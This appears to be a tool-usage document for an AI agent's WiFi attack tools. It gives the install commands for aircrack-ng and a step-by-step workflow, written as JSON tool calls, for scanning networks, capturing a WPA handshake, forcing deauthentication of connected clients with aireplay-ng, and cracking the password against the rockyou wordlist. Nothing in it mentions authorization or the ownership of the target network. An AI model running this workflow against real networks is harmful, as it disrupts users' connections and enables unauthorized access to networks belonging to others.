# WiFi Cracking (`wifi_scan`, `wifi_capture`, `wifi_crack`)

## Installation

| Tool | macOS | Linux |
|------|-------|-------|
| aircrack-ng | `brew install aircrack-ng` | `sudo apt install aircrack-ng` |

## Workflows

### Scan for networks
```json
{"tool": "wifi_scan", "args": {"interface": "en0"}}
```

### Capture handshake
```json
{"tool": "wifi_capture", "args": {"bssid": "AA:BB:CC:DD:EE:FF", "channel": "6", "timeout": 60}}
```

### Force deauth (if no handshake captured)
```json
{"tool": "execute_terminal", "args": {"cmd": "sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon"}}
```

### Crack with wordlist
```json
{"tool": "wifi_crack", "args": {"handshake_file": "/tmp/wpa_capture-01.cap", "wordlist": "/usr/share/wordlists/rockyou.txt"}}
```

## Requirements
- Linux with monitor mode
- Root/sudo
- aircrack-ng suite
- Compatible adapter (Atheros, Ralink, Realtek)
- WPA3 is NOT crackable via 4-way handshake capture
